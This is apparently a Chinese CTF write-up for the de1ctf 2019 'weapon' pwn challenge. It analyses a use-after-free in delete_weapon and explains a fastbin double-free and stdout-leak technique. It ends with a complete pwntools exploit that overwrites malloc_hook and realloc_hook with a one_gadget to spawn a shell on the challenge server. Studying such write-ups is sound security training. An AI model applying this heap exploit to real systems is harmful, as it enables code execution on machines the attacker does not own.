# de1ctf_2019_weapon#
# 总结
本题与这篇文章或者这篇文章的思路是一模一样的，但是由于有个eidt功能，所以利用起来更方便。
主要思路是：

- 构造fastbin和unsorted bin的overlapped chunk
- 爆破1个字节，利用fastbin attack分配chunk到stdout结构体上方，泄露libc地址
- 利用fastbin attack分配到malloc_hook上方，利用realloc_hook调整栈帧，使用one_gadget去getshell

# 题目分析#
## checksec

使用`checksec`查看保护情况如下：

```bash
[*] './de1ctf_2019_weapon'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

保护全开，libc使用2.23。

## 关键函数分析
### delete_weapon

反编译`delete_weapon`函数如下：

```c
unsigned __int64 delete_weapon()
{
  signed int idx;              // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2;         // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("input idx: ");
  idx = get_uint();
  if ( idx < 0 || idx > 9 )
  {
    printf("error");
    exit(0);
  }
  free(*((void **)&unk_202060 + 2 * idx));
  puts("Done!");
  return __readfsqword(0x28u) ^ v2;
}
```

有一个UAF漏洞，可以利用fastbin double free来构造出overlapped chunk。

## 利用思路
利用步骤：

- 利用UAF漏洞构造出overlapped fastbin chunk，布局为A--->B--->A
- 踩chunk A的fd的低字节，申请chunk到B的上方
- 修改B的chunk size为0x91
- 构造fastbin chunk和unsorted chunk重合的堆布局
- 分配fake chunk到stdout结构体上方泄露libc地址，这里需要爆破1个字节
- 利用realloc_hook + malloc_hook + one_gadget获取shell

# EXP

## 完整exp

```python
from pwn import *
import functools

LOG_ADDR = lambda x, y: log.success('{} ===> {}'.format(x, hex(y)))
int16 = functools.partial(int, base=16)
context.update(arch='amd64', os='linux', endian='little')


def create_weapon(size:int, idx:int, name, sh:tube):
    sh.sendlineafter("choice >> \n", '1')
    sh.sendlineafter("wlecome input your size of weapon: ", str(size))
    sh.sendlineafter("input index: ", str(idx))
    sh.sendafter("input your name:\n", name)


def delete_weapon(idx, sh:tube):
    sh.sendlineafter("choice >> \n", '2')
    sh.sendlineafter("input idx :", str(idx))


def rename_weapon(idx, name, sh:tube):
    sh.sendlineafter("choice >> \n", '3')
    sh.sendlineafter("input idx: ", str(idx))
    sh.sendafter("new content:\n", name)


def attack(malloc_hook_offset = 0x3c4b10, gadget = 0x4527a, realloc_offset = 0x84710, low_2th_byte=b'\xe5', sh:tube=None):
    create_weapon(0x60, 0, p64(0x71) * 10 + p64(0) + p64(0x71), sh)
    create_weapon(0x60, 1, p64(0x71) * 12, sh)
    create_weapon(0x60, 2, p64(0x51) * 12, sh)

    delete_weapon(0, sh)
    delete_weapon(1, sh)
    delete_weapon(0, sh)

    create_weapon(0x60, 3, b'\x50', sh)
    create_weapon(0x60, 3, b'\x50', sh)
    create_weapon(0x60, 3, b'\x50', sh)

    create_weapon(0x60, 4, 'a', sh)
    delete_weapon(1, sh)

    rename_weapon(4, p64(0x71) * 3 + p64(0x91), sh)
    delete_weapon(1, sh)

    rename_weapon(4, p64(0x71) * 3 + p64(0x71) + b'\xdd' + low_2th_byte, sh)

    create_weapon(0x60, 3, b'\x00', sh)

    create_weapon(0x60, 5, 0x33 * b'\x00' + p64(0x0FBAD1887) + p64(0) * 3 + b'\x58', sh)

    leak_libc_addr = u64(sh.recvn(8))
    LOG_ADDR('leak_libc_addr', leak_libc_addr)
    libc_base_addr = leak_libc_addr -  0x3c56a3
    LOG_ADDR('libc_base_addr', libc_base_addr)

    delete_weapon(1, sh)
    rename_weapon(4, p64(0x71) * 3 + p64(0x71) + p64(libc_base_addr + malloc_hook_offset - 0x23), sh)
    create_weapon(0x60, 3, 'a', sh)
    create_weapon(0x60, 3, 0xb * b'a' + p64(libc_base_addr + gadget) + p64(libc_base_addr + realloc_offset + 0xd), sh)

    sh.sendlineafter("choice >> \n", '1')
    sh.sendlineafter("wlecome input your size of weapon: ", str(64))
    sh.sendlineafter("input index: ", str(0))

    sh.sendline('id')
    sh.recvline_contains(b'uid', timeout=1)
    sh.interactive()

if __name__ == '__main__':
    sh = None
    while True:
        try:
            sh = remote('node3.buuoj.cn', 25668)
            attack(realloc_offset=0x846c0, gadget=0x4526a, sh=sh)
        except:
            try:
                sh.close()
            except:
                pass
```